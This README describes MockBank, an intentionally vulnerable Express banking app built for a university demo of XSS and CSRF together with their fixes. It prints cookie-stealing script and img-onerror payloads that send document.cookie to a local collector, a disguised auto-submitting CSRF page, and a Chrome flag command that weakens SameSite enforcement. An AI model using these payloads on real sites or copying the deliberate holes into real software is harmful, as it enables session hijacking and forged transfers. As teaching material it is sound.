# MockBank

A deliberately vulnerable web banking app used to demonstrate **XSS** and **CSRF**
attacks, and the corresponding defenses, for a university security presentation.

> ⚠️ This app is intentionally insecure in `--mode=vulnerable` (the default).
> Do not expose it to any network you don't fully control.

---

## Stack

- Node.js + Express
- `express-session` (in-memory) + `cookie-parser`
- No template engine, no frontend framework, no build step
- Fonts: Syne + DM Sans (Google Fonts)

---

## Run

```bash
npm install

# Vulnerable mode (default) — for demoing attacks
node server.js

# Safe mode — for demoing the fixes
node server.js --mode=safe
```

App runs at **http://localhost:3000**.

Demo accounts (hardcoded, in-memory):

| User  | Password  | Starting balance |
|-------|-----------|-----------------:|
| alice | alice123  |          $10,000 |
| bob   | bob123    |           $5,000 |

The current mode is shown as a pill badge in the navbar
(red = vulnerable, teal = safe).

---

## Attack 1 — Stored XSS (cookie theft)

### 1. Start the XSS collector (port 4000)

In a second terminal:

```bash
node attacker/xss-collector.js
```

Open **http://localhost:4000** — this is the attacker's dashboard. It lists
every cookie captured, auto-refreshing every 3 seconds.

### 2. Log in as alice and inject the payload

1. Go to http://localhost:3000 and sign in as `alice / alice123`.
2. Send a transfer to `bob` with any amount, and paste this into the **Note** field:

   ```html
   <script>fetch('http://localhost:4000/steal?c='+document.cookie)</script>
   ```

3. The transfer completes. The note is stored in the transaction history
   and rendered back on the dashboard **unescaped**.
4. Now log in as `bob / bob123` and send another transfer to `alice` so bob's
   dashboard shows the stored transaction — or just open alice's dashboard again.
   Every time the dashboard renders, the injected `<script>` runs and
   `document.cookie` (including the session cookie, because
   `httpOnly: false` in vulnerable mode) is shipped to the attacker.
5. Switch to the collector tab — the session cookie appears in the table.

### Alternate payload (useful when `<script>` is hard to trigger):

```html
<img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
```

### Why it works
- Transaction notes are rendered into HTML **without escaping**.
- The session cookie has `httpOnly: false`, so `document.cookie` sees it.

### Fix (`--mode=safe`)
- Every piece of user input passes through `escapeHtml()` before rendering.
- The session cookie is set with `httpOnly: true` — JavaScript cannot read it
  even if an XSS slips through.

Restart the server in safe mode, repeat the injection — the payload now
shows up as literal text and no cookie is exfiltrated.

---

## Attack 2 — CSRF (forged transfer)

### 1. Log in as alice

Go to http://localhost:3000, sign in as `alice / alice123`. **Keep the tab open**.

### 2. Open the attacker page

Open `attacker/csrf.html` directly in the **same browser** (either via
`file://` or by double-clicking the file). It looks like a lottery /
prize page.

### 3. Click "CLAIM MY PRIZE NOW"

An attack-console overlay appears and walks through each step of the CSRF
forgery (no CSRF token required → crafting forged request → submitting as
victim). After ~5 seconds the hidden form auto-submits to
`POST http://localhost:3000/transfer` with `to=bob, amount=5000`.

Because the browser attaches alice's session cookie to the cross-origin POST
(no CSRF token, no SameSite=Strict), the transfer succeeds. Alice returns
to her dashboard to find $5,000 missing and a new transaction.

### Why it works
- `POST /transfer` accepts any authenticated request — no CSRF token.
- Session cookie is set with `sameSite: 'none'`, so it gets attached to
  cross-origin POSTs.

### Fix (`--mode=safe`)
- A per-session CSRF token is generated and embedded as a hidden `_csrf`
  field in the transfer form.
- `POST /transfer` rejects requests where `_csrf` is missing or doesn't
  match the session value (HTTP 403).
- The session cookie is set with `sameSite: 'strict'`, so the browser
  refuses to send it on cross-origin requests in the first place.

Restart in safe mode, log back in as alice, open `csrf.html`, and click the
button — the request is blocked with *"CSRF token missing or invalid"*.

---

## Browser note

Modern Chrome will drop cookies with `SameSite=None` unless `Secure` is
also set. For the CSRF demo to reproduce reliably on plain `http://localhost`,
use **Firefox**, or launch Chrome with:

```bash
# Chrome on macOS, with relaxed SameSite enforcement for the demo
open -a "Google Chrome" --args \
  --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
```

Safe mode works in any browser — the fix doesn't depend on cookie
attributes being honored loosely.

---

## Project layout

```
mockbank/
├── server.js                 entry; parses --mode, wires routes + session
├── routes/
│   ├── auth.js               GET/POST /login, GET /logout
│   └── transfer.js           GET /dashboard, POST /transfer (+ CSRF check)
├── views/
│   ├── layout.js             shared HTML shell (nav, mode pill, theme)
│   ├── dashboard.js          dashboard body (balance, form, tx table)
│   └── escape.js             escapeHtml() — used only in safe mode
├── public/
│   └── login.html            static login page
└── attacker/
    ├── csrf.html             "lottery" page with hidden auto-submit form
    └── xss-collector.js      :4000 server that logs captured cookies
```

---

## What to compare in a live demo

| Concern            | Vulnerable                      | Safe                        |
|--------------------|---------------------------------|-----------------------------|
| Note rendering     | raw HTML                        | `escapeHtml()`              |
| Session cookie     | `httpOnly: false`               | `httpOnly: true`            |
| Cross-origin POST  | `sameSite: 'none'`              | `sameSite: 'strict'`        |
| CSRF token         | none                            | per-session, validated      |
| Mode badge         | 🔴 VULNERABLE                   | 🟢 SAFE                     |

Flip between the two by restarting with / without `--mode=safe`.
